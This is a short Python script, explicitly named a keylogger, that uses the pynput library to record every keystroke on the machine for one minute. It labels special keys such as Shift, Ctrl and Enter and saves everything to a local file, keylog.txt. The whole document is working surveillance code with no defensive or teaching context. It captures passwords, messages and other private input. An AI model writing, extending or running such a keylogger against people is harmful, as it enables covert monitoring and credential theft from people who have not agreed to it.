import pynput
from pynput import keyboard
import threading

# List to store the captured keystrokes
keystrokes = []

# Define a callback function to handle each key press
def on_press(key):
    try:
        # Alphanumeric key
        keystrokes.append(key.char)
    except AttributeError:
        # Special key (e.g., shift, ctrl, space)
        if key == keyboard.Key.space:
            keystrokes.append(' ')
        elif key == keyboard.Key.enter:
            keystrokes.append('\n')
        elif key == keyboard.Key.tab:
            keystrokes.append('\t')
        elif key == keyboard.Key.backspace:
            keystrokes.append('[BACKSPACE]')
        elif key == keyboard.Key.esc:
            keystrokes.append('[ESC]')
        elif key == keyboard.Key.shift:
            keystrokes.append('[SHIFT]')
        elif key == keyboard.Key.shift_r:
            keystrokes.append('[SHIFT_R]')
        elif key == keyboard.Key.ctrl_l:
            keystrokes.append('[CTRL_L]')
        elif key == keyboard.Key.ctrl_r:
            keystrokes.append('[CTRL_R]')
        elif key == keyboard.Key.alt_l:
            keystrokes.append('[ALT_L]')
        elif key == keyboard.Key.alt_r:
            keystrokes.append('[ALT_R]')
        elif key == keyboard.Key.caps_lock:
            keystrokes.append('[CAPS_LOCK]')
        elif key == keyboard.Key.cmd:
            keystrokes.append('[CMD]')
        elif key == keyboard.Key.cmd_r:
            keystrokes.append('[CMD_R]')
        else:
            keystrokes.append(f'[{key}]')

# Define a function to stop the listener
def stop_listener(listener):
    listener.stop()

# Define the keylogger function
def keylogger():
    # Create a listener for keyboard events
    listener = keyboard.Listener(on_press=on_press)
    
    # Start the listener
    listener.start()
    
    # Set a timer to stop the listener after 1 minute (60 seconds)
    timer = threading.Timer(60, stop_listener, [listener])
    timer.start()
    
    # Wait for the listener to stop
    listener.join()
    
    # Save the captured keystrokes to a file
    with open('keylog.txt', 'w') as f:
        for key in keystrokes:
            f.write(key)

# Run the keylogger
keylogger()
